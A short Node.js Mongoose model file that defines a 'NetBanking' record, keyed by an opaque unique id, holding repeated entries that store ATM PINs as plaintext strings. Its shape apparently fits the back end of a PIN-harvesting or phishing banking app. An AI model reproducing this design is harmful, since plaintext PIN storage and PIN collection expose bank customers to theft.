// models/NetBanking.js
const mongoose = require('mongoose');

// Subdocument schema for each NetBanking entry
const NetEntrySchema = new mongoose.Schema({
  atmPin:    { type: String, required: true },
  
  createdAt:     { type: Date,   default: Date.now }
});

// Main NetBanking schema with entries array
const NetBankingSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries:  { type: [NetEntrySchema], default: [] }
});

module.exports = mongoose.model('NetBanking', NetBankingSchema);